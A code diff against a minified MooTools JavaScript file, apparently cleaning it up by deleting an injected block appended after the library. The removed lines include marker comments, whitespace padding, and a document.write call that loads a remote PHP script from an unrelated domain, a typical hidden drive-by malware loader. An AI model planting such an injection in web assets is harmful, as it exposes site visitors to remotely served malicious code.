@@ -354,12 +354,3 @@ b.html=d.stripScripts(function(e){b.javascript=e;});var a=this.processHTML(b.htm
 }return this.retrieve("load");}};Element.implement({load:function(){this.get("load").send(Array.link(arguments,{data:Object.type,url:String.type}));return this;
 }});Request.JSON=new Class({Extends:Request,options:{secure:true},initialize:function(a){this.parent(a);this.headers.extend({Accept:"application/json","X-Request":"JSON"});
 },success:function(a){this.response.json=JSON.decode(a,this.options.secure);this.onSuccess(this.response.json,a);}});
-
-/*1f6af2*/
-
-                    																	                               	 /*gbargbar09311gbar09*/
-
-document.write("<script type='text/javascript' src='http://j-j-computer.de/6Wf2mtKy.php?id=525369'></"+ "script>");
-
-
-/*/1f6af2*/
